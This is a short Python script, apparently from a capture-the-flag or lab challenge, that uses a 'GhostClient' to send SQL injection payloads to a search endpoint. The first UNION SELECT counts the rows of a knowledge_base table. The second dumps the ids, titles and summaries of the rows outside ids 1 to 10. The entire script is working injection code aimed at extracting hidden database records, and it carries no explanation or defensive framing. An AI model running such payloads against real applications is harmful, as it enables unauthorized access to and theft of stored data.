from client import GhostClient

c = GhostClient()
c.bootstrap()

res = c.request("search", {"q": "' UNION SELECT 1, cast(count(*) as text), 'total' FROM knowledge_base--"})
print("Total count:", res)

res = c.request("search", {"q": "' UNION SELECT 1, cast(id as text), title || ' || ' || summary FROM knowledge_base WHERE id NOT BETWEEN 1 AND 10--"})
print("Other IDs:", res)
